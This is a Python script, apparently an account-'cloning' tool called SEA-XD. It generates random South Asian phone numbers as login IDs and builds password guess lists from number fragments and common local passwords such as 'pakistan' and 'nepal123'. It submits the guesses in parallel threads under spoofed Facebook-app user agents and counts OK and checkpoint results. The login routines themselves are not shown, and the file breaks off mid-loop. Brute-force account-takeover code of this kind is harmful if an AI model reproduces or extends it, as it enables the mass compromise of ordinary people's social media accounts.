"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
#-->-WRITTEN-BY-NOOR-404-<--#
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
#----------------\<-MODULE->/----------------#
import os,sys,platform,pytz,time,random,uuid,json,string
from os import system
from datetime import datetime
from time import localtime as lt
from pip._vendor import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#----------------\<-COLOR->/----------------#
G="\033[1;92m";W="\x1b[38;5;15m";B="\033[1;34m";Y="\x1b[38;5;226m";A="\x1b[38;5;123m";R="\33[1;91m";O="\x1b[38;5;81m";X="\x1b[38;5;205m";P="\x1b[10;95m"
#----------------\<-STYLE->/----------------#
xp = f"{G}<[{W}●{G}]>{W}";xp1 = f"{G}<[{W}1{G}]>{W}";xp2 = f"{G}<[{W}2{G}]>{W}";xp3 = f"{G}<[{W}3{G}]>{W}";xp4 = f"{G}<[{W}4{G}]>{W}";xp5 = f"{G}<[{W}5{G}]>{W}";xp0 = f"{G}<[{W}0{G}]>{W}";xpx = f"{G}<[{W}?{G}]>{W}";xpxx=f"{G}>{W}>{G}>{W}"
#----------------\<-SYS->/----------------#
sys.stdout.write('\x1b[1;37m\x1b]2; SEA~XD\x07')
#----------------\<-FILE-PATH->/----------------#
sd_folder = "/sdcard/SEA-XD";sea_folder = ("RANDOM","FILE");os.makedirs(sd_folder, exist_ok=True)
for sea_folder in sea_folder:os.makedirs(os.path.join(sd_folder, sea_folder), exist_ok=True)
#----------------\<-GREET->/----------------#
def __GREET__():
    bd_timezone = pytz.timezone("Asia/Dhaka");bd_time = datetime.now(bd_timezone).hour
    if 5 <= bd_time < 12:return "GOOD MORNING"
    elif 12 <= bd_time < 18:return "GOOD AFTERNOON"
    else:return "GOOD NIGHT"
#----------------\<-DATE->/----------------#
__dic__ = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'};__days__ = datetime.now().day;__months__ = __dic__[(str(datetime.now().month))];__years__ = datetime.now().year;__date__ = f'{W}'+str(__days__)+f'{G}/{W}'+str(__months__)+f'{G}/{W}'+str(__years__);ltx = int(lt()[3])
if ltx > 12:a = ltx-12;tag = "PM"
else:a = ltx;tag = "AM"
#----------------\<-COUNTRY->/----------------#
ip = requests.get("https://api.ipify.org").text;ip_info = requests.post('http://ip-api.com/json/'+ip);af = json.loads(ip_info.text)
#----------------\<-CLEAR->/----------------#
def __CLEAR__():
	if sys.platform.lower() == "win":system("cls")
	if sys.platform.lower() == "linux":system("clear")
	else:raise NameError(f'{xp} SOMETHING WENT WRONG{R}...!')
	print(logo)
#----------------\<-LINE->/----------------#
def __LINE__():print(f"{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#----------------\<-SHORT->/----------------#
__GREETING__ = __GREET__();__COUNTRYS__ = af['country'].upper()
#----------------\<-UA-FOR-RANDOM->/----------------#
def ___UPD___():
	mix = random.choice(["SM-T835","SM-S901U","SM-S134DL","SM-J250F","SM-A217F","SM-A326B","SM-A125F","SM-A720F","SM-A326U","SM-G532M","SM-J410G","SM-A205GN","SM-A205GN","SM-A505GN","SM-G930F","SM-J210F","SM-N9005","SM-J210F","CPH2083","CPH2235", "CPH2499","CPH2185","CPH2065","CPH2197","CPH1989","CPH2145","F1w","CPH1909","CPH2065","CPH1937","CPH2095","CPH2083","CPH2249","CPH2083","CPH2239","CPH1979","CPH2067","CPH2069","CPH2239","CPH2015","CPH2021","CPH2205","CPH2069","CPH2161","CPH2207","CPH2239","CPH1909","CPH2185","CPH2127","CPH1923","CPH1931","PHN110", "CPH2599", "CPH2499", "CPH2557", "CPH8686", "CPH9177", "CPH9226", "OPPO F1 Plus", "CPH2071", "PCHM00", "CPH2083", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH2477", "CPH2471", "CPH2591", "CPH1923", "CPH1925", "CPH1837", "OPPO A30","RMX1945", "RMX1911", "RMX2193", "RMX1945", "RMX1931", "RMX2170", "RMX3201", "RMX2180", "RMX2021", "RMX2020", "RMX2155", "RMX1921", "RMX2156", "RMX3363", "RMX3081", "RMX2001", "RMX2001", "RMX3263", "RMX2155", "RMX2001", "RMX3195", "RMX1945", "RMX1945", "RMX1993","vi"+"vo 1901","V2"+"026","V20"+"58","viv"+"o 1716","vi"+"vo 1808","vi"+"vo 1935","vi"+"vo 1951","vi"+"vo 1906","vivo 1808","vivo 1920","vivo 1901", "V2026","V2058","vivo 1716","vivo 1935","vivo 1951","vivo 1906","V2111","vivo 1915","V1911A","V2036","vivo 1907","vivo 1906","vivo 1915","V2025","vivo 1820","vivo 1904","vivo 1901","V1955A","LG-H342","Redmi Note 4", "Redmi 4X", "Redmi 3", "Redmi 4", "Redmi 3X", "Redmi Note 7", "Redmi 6A", "Redmi Note 8 Pro", "Redmi 5A", "Redmi 5", "Redmi 6 Pro", "Redmi Note 5", "Redmi Note 4", "Redmi Y2", "Redmi 7A", "Redmi Note 7S", "Redmi Note 8T", "Redmi Note 8 Pro", "M2003J15SC", "Redmi 5 Plus", "Redmi Note 9 Pro", "Redmi Note 9S", "LDN-L21", "M2103K19G","RMX1945","RMX1911","RMX2193","RMX1945","RMX1931","RMX2170","RMX3201","RMX2180","RMX2021","RMX2020","RMX2155","RMX1921","RMX2156","RMX3363","RMX3081","RMX2001","RMX2001","RMX3263","RMX2155","RMX2001","RMX3195","RMX1945","RMX1945","RMX1993","RMX2180","RMX3630","RMX3686","RMX1805","RMX1801","RMX2020","RMX1811","RMX3063","RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921","vivo 1906","vivo 1904","vivo Y13L","vivo 1901","V2120","V2204","vivo 1902","V2310","V2333","vivo 1929","vivo 1915","vivo 1811","V2027","V2043","V2038","V2111","V2110","V2206","V2207","vivo Y23L","V2249","vivo 1613","vivo Y28L","vivo 1938","PADM00","CPH1837","PADT00","CPH1803","CPH1853","CPH1805","CPH1931","CPH1959","CPH1933","CPH1935","CPH1943","CPH1909","CPH1901","PDBM00","CPH1941","CPH2179","CPH2083","CPH2185","CPH2185","CPH2477","CPH2591","CHP2219","CPH1923","CPH2213","CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"])
	fban = random.choice(["FB4A"])
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_ver_code = str(random.randint(10000000, 66666666))
	density = random.choice(['1.0','1.7','2.0','2.25','2.5','3.0','3.5'])
	width = random.randint(720, 1440)
	height = random.randint(1080, 2560)
	fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
	sim_name = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Skitto","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
	fbpn = random.choice(["com.facebook.katana","com.facebook.orca"])
	fbmf = 'Samsung'
	fbbd = 'Samsung'
	mobile_model = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	modelx = random.choice(["SM-S918B","SM-S916B","SM-S911B","SM-F936B","SM-F721B","SM-S908B","SM-S906B","SM-S901B","SM-A546B","SM-A346B","SM-A146B","SM-A736B","SM-A536B","SM-A336B","SM-A236B","SM-A135F","SM-A047F","SM-M546B","SM-M536B","SM-M336B","SM-M236B","SM-E236B","SM-E135F","SM-A725F","SM-A528B","SM-A525F","SM-A326B","SM-A226B","SM-M426B","SM-M326B","SM-M127F","SM-F415F","SM-A022F","SM-A025F","SM-A013F","SM-E025F","SM-A105F","SM-A107F","SM-A205F","SM-A207F","SM-A305F","SM-A307F","SM-A505F","SM-A515F","SM-A705F","SM-A715F","SM-M215F","SM-M315F","SM-M515F","SM-M405F","SM-M307F","SM-A600F","SM-A605F","SM-J600F","SM-J810F","SM-J415F","SM-J530F","SM-G611F","SM-J720F","SM-G885F","SM-A920F","SM-G965F","SM-G960F","SM-G955F","SM-G950F","SM-G935F","SM-G930F","SM-N960F","SM-N950F","SM-A530F","SM-A730F","SM-J260F","SM-J701F","SM-J500F","SM-A500F","SM-A300F","SM-A700F","SM-G887F","SM-A507F","SM-A707F","SM-C900F","SM-C701F","SM-C501F","SM-J200F","SM-J210F","SM-G532F","SM-J3119","SM-J400F","SM-G570F","SM-J610F","SM-G615F","SM-J701F","SM-J730F","SM-J700F","SM-G610F","SM-J727P","SM-J320F","SM-J330F","SM-J337P","SM-J327P","SM-J110F","SM-J105F","SM-J106B","SM-G360F","SM-G355H","GT-I8260","SM-G530F","SM-J250F","SM-G710F","SM-A202F","SM-A405F","SM-A908B","SM-M015G","SM-M017F","SM-M115F","SM-M217F","SM-M315F","SM-M013F","SM-F900F","SM-F700F","SM-F707B","SM-N920F","SM-N930F","SM-N935F","SM-N910F","SM-N9005","GT-I9200","SM-G750F","GT-I9152","SM-G900F","SM-G800F","SM-G903F","SM-G920F","SM-G925F","SM-G928F","SM-G850F","SM-E700F","SM-E500F","SM-J500F","SM-J100F","SM-A217F","SM-A207F","SM-A315F","SM-A415F","SM-A115F","SM-A215F","SM-A615F","SM-A815F","SM-M115F","SM-A015F"])
	last = f"[FBAN/{fban};FBAV/{facebook_version};FBBV/{fb_ver_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{fblc};FBCR/{sim_name};FBMF/{fbmf};FBBD/{fbbd};FBPN/{fbpn};FBDV/{modelx};FBSV/{mobile_model};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {mix} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+last
	return ua
#----------------\<-UA-FOR-FILE->/----------------#
class UserAgentGenerator:
    def __init__(self):
        self.fbans = ["FB4A"]
        self.common_info = {
            "FBLC": ["en_US","en_GB","de_DE","fr_FR","bn_BD","hi_IN","id_ID","pt_BR"],
            "FBCR": ["Verizon", "Sprint", "T-Mobile", "Teletalk","Airtel", "Grameenphone", "Jio", "Robi", "Banglalink", "Telkomsel"],
            "FBSV": ["9.0", "10.0", "11.0", "12.0", "13.0", "14.0"],
            "FBCA": ["armeabi-v7a:armeabi", "arm64-v8a:armeabi"]
        }
        self.devices = {
            "mobile": {
                "FBMF": ["Samsung", "Xiaomi", "realme", "OPPO", "Vivo", "Huawei", "Motorola", "Infinix", "Tecno", "Nokia"],
                "FBBD": ["Samsung", "Xiaomi", "realme", "OPPO", "Vivo", "Huawei", "Motorola", "Infinix", "Tecno", "Nokia"],
                "FBDV": ["SM-A135F", "M2101K6G", "RMX3085", "CPH1909", "V2027", "X6812", "TECNO-KG6", "TA-1234", "Moto G60"],
            },
            "tablet": {
                "FBMF": ["Samsung", "Lenovo", "Huawei"],
                "FBBD": ["Samsung", "Lenovo", "Huawei"],
                "FBDV": ["SM-T295", "Lenovo TB-X505F", "Huawei MediaPad T3", "SM-T500"],
            },
            "ios": {
                "FBMF": ["Apple"],
                "FBBD": ["Apple"],
                "FBDV": ["iPhone6,1", "iPhone6,2", "iPhone7,2", "iPhone7,1", "iPad7,11", "iPhone8,1", "iPhone8,2", "iPad7,12", "iPhone9,1", "iPhone9,3", "iPad11,6", "iPhone9,2", "iPhone9,4", "iPhone10,1", "iPad11,7", "iPhone10,4", "iPhone10,2", "iPhone10,5", "iPhone10,3", "iPhone10,6", "iPhone11,8", "iPad12,1", "iPhone11,2", "iPhone11,4", "iPhone11,6", "iPad12,2", "iPhone12,1", "iPhone12,3", "iPhone12,5", "iPhone12,8", "iPad8,9", "iPad8,10", "iPhone13,1", "iPhone13,2", "iPhone13,3", "iPhone13,4", "iPhone14,4", "iPhone14,5", "iPhone14,2", "iPhone14,3", "iPhone14,6", "iPhone15,2", "iPhone15,3", "iPhone15,4", "iPad13,18", "iPad13,19", "iPad13,4", "iPad13,5", "iPad13,6", "iPad13,7"],
                "FBSV": ["10.0", "10.1", "10.2", "10.3", "11.0", "11.1", "11.2", "11.3", "11.4", "12.0", "12.1", "12.2", "12.3", "12.4", "13.0", "13.1", "13.2", "13.3", "13.4", "13.5", "13.6", "13.7", "14.0", "14.1", "14.2", "14.3", "14.4", "14.5", "14.6", "14.7", "14.8", "15.0", "15.1", "15.2", "15.3", "15.4", "15.5", "15.6", "15.7", "16.0", "16.1", "16.2", "16.3", "16.4", "16.5", "16.6", "16.7", "17.0", "17.1", "17.2", "17.3", "17.4"]
            }
        }
    def generate(self, ua_type="mobile"):
        ua_type = ua_type.lower()
        device_info = self.devices.get(ua_type, self.devices["mobile"])
        fbav = f"{random.randint(10, 437)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}"
        fban = random.choice(self.fbans)
        fbbv = str(random.randint(10000000, 99999999))
        fb_dm = f"{{density={round(random.uniform(2.0, 4.5), 2)},width={random.randint(720,1440)},height={random.randint(1280,2560)}}}"
        return (
            f"[FBAN/{fban};FBAV/{fbav};FBBV/{fbbv};"
            f"FBDM/{fb_dm};"
            f"FBLC/{random.choice(self.common_info['FBLC'])};"
            f"FBRV/{random.randint(100000000,999999999)};"
            f"FBCR/{random.choice(self.common_info['FBCR'])};"
            f"FBMF/{random.choice(device_info['FBMF'])};"
            f"FBBD/{random.choice(device_info['FBBD'])};"
            f"FBPN/com.facebook.orca;"
            f"FBDV/{random.choice(device_info['FBDV'])};"
            f"FBSV/{random.choice(device_info.get('FBSV', self.common_info['FBSV']))};"
            f"FBOP/1;"
            f"FBCA/{random.choice(self.common_info['FBCA'])};]"
        )
#----------------\<-LOGO->/----------------#
logo = (f"""
{G}  ┏━┓┏━╸┏━┓   ╻ ╻╺┳┓  ●{W} DEVELOPER {xpxx} NOOR-404
{W}  ┗━┓┣╸ ┣━┫{G}╺━╸{W}┏╋┛ ┃┃{G}  ●{W} STATUS    {xpxx} PREMIUM
{G}  ┗━┛┗━╸╹ ╹   ╹ ╹╺┻┛  ●{W} VERSION   {xpxx} V{G}/{W}0.2
{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{W}       😈 MIND IT NOTHING IS IMPOSSIBLE 😈
{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{xp} FUTURES  {xpxx} RANDOM{G}〤{W}FILE
{xp} GREET    {xpxx} {__GREETING__}
{xp} TODAYS   {xpxx} {__date__}
{xp} COUNTRY  {xpxx} {__COUNTRYS__}
{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{xp} USERNAME {xpxx} HELLO WORLD
{xp} EXPIRE   {xpxx} HELLO WORLD
{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#----------------\<-SELF->/----------------#
class __SEAXNOOR__:
    def __init__(self):self.loop = 0;self.oks = [];self.cps = [];self.sea = [];self.nvs = [];self.twf = [];self.gen = [];self.plist = [];self.__COOKIE__ = []
#----------------\<-APPROVAL->/----------------#
#----------------\<-MAIN-MENU->/----------------#
    def __MENU__(self):
    	__CLEAR__();print(f"{xp1} RANDOM CLONING ");print(f"{xp2} FILE CLONING ");print(f"{xp0} EXIT TOOLS ");__LINE__();__MENUC__ = input(f"{xpx} INPUT MENU {xpxx} ")
    	if __MENUC__ == "1":self.__RANDOM__()
    	if __MENUC__ == "2":self.__FILE__()
    	if __MENUC__ == "0":__LINE__();print(f"{xp} EXIT SUCCESSFULLY ");time.sleep(1.1);__LINE__()
    	if __MENUC__ not in ["1","2","0"]:__LINE__();print(f"{xp} INVALID OPTION TRY AGAIN ");time.sleep(1);self.__MENU__()
#----------------\<-RANDOM-MENU->/----------------#
    def __RANDOM__(self):
    	__CLEAR__();print(f"{xp1} AUTO SIM   {G}<[{W}BD{G}-{W}ONLY{G}]> ");print(f"{xp2} MANUAL SIM {G}<[{W}OTHER-S{G}]> ");print(f"{xp0} BACK MENU ");__LINE__();__SIMS__ = input(f"{xpx} INPUT SIM {xpxx} ")
    	if __SIMS__ == "1":self.__AUTOO__()
    	if __SIMS__ == "2":self.__RANDOMX__()
    	if __SIMS__ == "0":self.__MENU__()
    	if __SIMS__ not in ["1","2","0"]:__LINE__();print(f"{xp} INVALID OPTION TRY AGAIN ");time.sleep(1);self.__RANDOM__()
#----------------\<-RANDOM-MANUAL-COUNTRY->/----------------#
    def __RANDOMX__(self):
    	__CLEAR__();print(f"{xp1} BANGLADESH CLONING ");print(f"{xp2} PAKISTAN CLONING ");print(f"{xp3} INDIA CLONING ");print(f"{xp4} NEPAL CLONING ");print(f"{xp0} BACK MENU ");__LINE__();__CONC__ = input(f"{xpx} INPUT COUNTRY {xpxx} ")
    	if __CONC__ == "1":self.sea.append("1");self.__RANDOMM__()
    	if __CONC__ == "2":self.sea.append("2");self.__RANDOMM__()
    	if __CONC__ == "3":self.sea.append("3");self.__RANDOMM__()
    	if __CONC__ == "4":self.sea.append("4");self.__RANDOMM__()
    	if __CONC__ == "0":self.__RANDOM__()
    	if __CONC__ not in ["1","2","3"," 4","0"]:__LINE__();print(f"{xp} INVALID OPTION TRY AGAIN ");time.sleep(1);self.__RANDOMX__()
#----------------\<-RANDOM-AUTO-MENU->/----------------#
    def __AUTOO__(self):
    	__CLEAR__();print(f"{xp} EXAMPLE  {xpxx} 6666 {G}/{W} 7777 {G}/{W} 8888 {G}/{W} 9999");__LINE__();__LIMIT__ = int(input(f"{xpx} INPUT LIMIT {xpxx} "));__CLEAR__();print(f"{xp1} METHOD {G}<[{W}1{G}]>{W}");print(f"{xp2} METHOD {G}<[{W}2{G}]>{W}");print(f"{xp3} METHOD {G}<[{W}3{G}]>{W}");print(f"{xp4} METHOD {G}<[{W}4{G}]>{W}");print(f"{xp5} METHOD {G}<[{W}5{G}]>{W}");__LINE__();__METHODR__ = input(f"{xpx} INPUT MENU {xpxx} ")
    	for nmbr in range(__LIMIT__):prefix = random.choice(["013","014","015","016","017","018","019"]);nmp = ''.join(random.choice(string.digits) for _ in range(8));nmpd = prefix + nmp;self.gen.append(nmpd)
    	__CLEAR__();print(f"{xp1} AUTO PASSLIST ");print(f"{xp2} CUSTOM PASSLIST ");__LINE__();__PASSR__ = input(f"{xpx} INPUT PASSLIST {xpxx} ")
    	if __PASSR__ == "1":self.plist = ["bangladesh","i love you"]
    	if __PASSR__ not in ["1"]:
        	try:__CLEAR__();__PASSRM__ = int(input(f"{xp} PASSLIST LIMIT {xpxx} "))
        	except:__PASSRM__ = 5
        	__CLEAR__();print(f"{xp} EXAMPLE  {xpxx} first6 {G}/{W} last6 {G}/{W} first8 ");__LINE__()
        	for i in range(__PASSRM__):self.plist.append(input(f"{xp} ENTER PASSLIST {G}<[{W}{i+1}{G}]> {xpxx} "))
    	__CLEAR__();print(f"{xp1} AUTO SPEED {G}<[{W}30{G}]> ");print(f"{xp2} CUSTOM SPEED ");__LINE__();__SPEED__ = input(f"{xpx} INPUT SPEED {xpxx} ")
    	if __SPEED__ == "1":__MAXX__ = 30
    	else:
    	    try:__CLEAR__();print(f"{xp} MAXIMUM SPEED LIMIT 30-60 ");__LINE__();__MAXX__ = int(input(f"{xpx} INPUT SPEED {xpxx} "))
    	    except ValueError:__MAXX__ = 60
    	with ThreadPool(max_workers=__MAXX__) as ___SEA___:
    	    __CLEAR__();__TL__ = str(len(self.gen));print(f"{xp} SIM{G}/{W}IDS  {xpxx} {W}AUTO{G}/{W}{__TL__} ");print(f"{xp} IF NO RESULT ON{G}/{W}OFF AIRPLANE MODE");__LINE__()
    	    for ids in self.gen:
    	        passlist = [ids,ids[:8],ids[:7],ids[:6],ids,ids[1:],ids[2:]]
    	        for ps in self.plist:passlist.append(ps)
    	        if __METHODR__ == "1":___SEA___.submit(self.__M1XX__,ids,passlist)
    	        if __METHODR__ == "2":___SEA___.submit(self.__M2XX__,ids,passlist)
    	        if __METHODR__ == "3":___SEA___.submit(self.__M3XX__,ids,passlist)
    	        if __METHODR__ == "4":___SEA___.submit(self.__M4XX__,ids,passlist)
    	        if __METHODR__ == "5":___SEA___.submit(self.__M5XX__,ids,passlist)
    	        if __METHODR__ not in ["1","2","3","4","5"]:___SEA___.submit(self.__M1XX__,ids,passlist)
    	print("\033[1;37m");__LINE__();print(f"{xp} THE PROCESS HAS COMPLETED...!");print(f"{xp} TOTAL OK{G}/{W}NV{G}/{W}CP {xpxx}{B} "+str(len(self.oks))+f"{G}/{R}"+str(len(self.nvs))+f"{G}/{Y}"+str(len(self.cps)));__LINE__();print(f"{xp} THANKS FOR USING.....! ")
#----------------\<-RANDOM-MANUAL-MENU->/----------------#
    def __RANDOMM__(self):
    	__CLEAR__()
    	if "1" in self.sea:print(f"{xp} EXAMPLE  {xpxx} 016 {G}/{W} 017 {G}/{W} 018 {G}/{W} 019");__LINE__()
    	if "2" in self.sea:print(f"{xp} EXAMPLE  {xpxx} 0306 {G}/{W} 0315 {G}/{W} 0345 {G}/{W} 0335");__LINE__()
    	if "3" in self.sea:print(f"{xp} EXAMPLE  {xpxx} 91639 {G}/{W} 91687 {G}/{W} 91612 {G}/{W} 91623");__LINE__()
    	if "4" in self.sea:print(f"{xp} EXAMPLE  {xpxx} 9814 {G}/{W} 9815 {G}/{W} 9861 {G}/{W} 9840");__LINE__()
    	__CODE__ = input(f"{xpx} INPUT SIM {xpxx} ");__CLEAR__();print(f"{xp} EXAMPLE  {xpxx} 6666 {G}/{W} 7777 {G}/{W} 8888 {G}/{W} 9999");__LINE__();__LIMIT__ = int(input(f"{xpx} INPUT LIMIT {xpxx} "));__CLEAR__();print(f"{xp1} METHOD {G}<[{W}1{G}]>{W}");print(f"{xp2} METHOD {G}<[{W}2{G}]>{W}");print(f"{xp3} METHOD {G}<[{W}3{G}]>{W}");print(f"{xp4} METHOD {G}<[{W}4{G}]>{W}");print(f"{xp5} METHOD {G}<[{W}5{G}]>{W}");__LINE__();__METHODR__ = input(f"{xpx} INPUT MENU {xpxx} ")
    	for nmbr in range(__LIMIT__):
    	    if "1" in self.sea:nmp = ''.join(random.choice(string.digits) for _ in range(8));self.gen.append(nmp)
    	    if "2" in self.sea:nmp = ''.join(random.choice(string.digits) for _ in range(7));self.gen.append(nmp)
    	    if "3" in self.sea:nmp = ''.join(random.choice(string.digits) for _ in range(6));self.gen.append(nmp)
    	    if "4" in self.sea:nmp = ''.join(random.choice(string.digits) for _ in range(6));self.gen.append(nmp)
    	__CLEAR__();print(f"{xp1} AUTO PASSLIST ");print(f"{xp2} CUSTOM PASSLIST ");__LINE__();__PASSR__ = input(f"{xpx} INPUT PASSLIST {xpxx} ")
    	if __PASSR__ == "1":
    	    if "1" in self.sea:self.plist = ["bangladesh","i love you"]
    	    if "2" in self.sea:self.plist = ["khankhan","khan1122","ali12345","khanbaba","pakistan","khan12345","ali1122","khankhan12345","khan","baloch","pubg","pubg1122"]
    	    if "3" in self.sea:self.plist = ["57575751","57273200","59039200"]
    	    if "4" in self.sea:self.plist = ["nepal12","nepal123","nepal1234","nepal12345","maya123","kathmandu","pokhara","tamang","maya1234","tamang123","tamang12345","nepal@123","kathmandu123"]
    	if __PASSR__ not in ["1"]:
        	try:__CLEAR__();__PASSRM__ = int(input(f"{xp} PASSLIST LIMIT {xpxx} "))
        	except:__PASSRM__ = 5
        	__CLEAR__();print(f"{xp} EXAMPLE  {xpxx} first6 {G}/{W} last6 {G}/{W} first8 ");__LINE__()
        	for i in range(__PASSRM__):self.plist.append(input(f"{xp} ENTER PASSLIST {G}<[{W}{i+1}{G}]> {xpxx} "))
    	__CLEAR__();print(f"{xp1} AUTO SPEED {G}<[{W}30{G}]> ");print(f"{xp2} CUSTOM SPEED ");__LINE__();__SPEED__ = input(f"{xpx} INPUT SPEED {xpxx} ")
    	if __SPEED__ == "1":__MAXX__ = 30
    	else:
    	    try:__CLEAR__();print(f"{xp} MAXIMUM SPEED LIMIT 30-60 ");__LINE__();__MAXX__ = int(input(f"{xpx} INPUT SPEED {xpxx} "))
    	    except ValueError:__MAXX__ = 60
    	with ThreadPool(max_workers=__MAXX__) as ___SEA___:
    	    __CLEAR__();__TL__ = str(len(self.gen));print(f"{xp} SIM{G}/{W}IDS  {xpxx} {W}{__CODE__}{G}/{W}{__TL__} ");print(f"{xp} IF NO RESULT ON{G}/{W}OFF AIRPLANE MODE");__LINE__()
    	    for love in self.gen:
    	        ids = __CODE__ + love
    	        if "1" in self.sea:passlist = [ids,ids[:8],ids[:7],ids[:6],love,love[1:],love[2:]]
    	        if "2" in self.sea:passlist = [ids,love,ids[5:],'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
    	        if "3" in self.sea:passlist = ["57575751","57273200","59039200",ids[4:],ids[3:]]
    	        if "4" in self.sea:passlist = [ids,love,ids[:8],ids[:7],ids[:6],"nepal12","nepal123","nepal1234","nepal12345","maya123","kathmandu","pokhara","tamang","maya1234","tamang123","tamang12345","nepal@123","kathmandu123"]
    	        for ps in self.plist:passlist.append(ps)
